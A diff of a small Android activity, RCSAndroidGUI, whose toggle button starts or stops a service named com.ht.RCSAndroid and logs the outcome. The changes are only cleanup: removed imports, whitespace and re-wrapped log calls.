@@ -10,7 +10,6 @@ package com.ht.RCSAndroidGUI;
 
 import android.app.Activity;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
@@ -18,8 +17,6 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.ToggleButton;
-
-import com.ht.RCSAndroidGUI.utils.Check;
 
 /**
  * The Class RCSAndroidGUI.
@@ -36,7 +33,7 @@ public class RCSAndroidGUI extends Activity {
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
-		
+
 		// Set up click listeners
 		final Button runButton = (Button) findViewById(R.id.btntoggle);
 		runButton.setOnClickListener(new OnClickListener() {
@@ -50,9 +47,8 @@ public class RCSAndroidGUI extends Activity {
 						if (cn == null) {
 							Log.d("RCS", "RCS Service not started");
 						} else {
-							Log.d("RCS",
-									"RCS Service Name: "
-											+ cn.flattenToShortString());
+							Log.d("RCS", "RCS Service Name: "
+									+ cn.flattenToShortString());
 						}
 					} catch (final SecurityException se) {
 						Log.d("RCS",
@@ -61,11 +57,13 @@ public class RCSAndroidGUI extends Activity {
 				} else {
 					try {
 						if (stopService(new Intent("com.ht.RCSAndroid")) == true) {
-							Log.d("RCS",
-									"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
+							Log
+									.d("RCS",
+											"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
 						} else {
-							Log.d("RCS",
-									"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
+							Log
+									.d("RCS",
+											"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
 						}
 					} catch (final SecurityException se) {
 						Log.d("RCS",
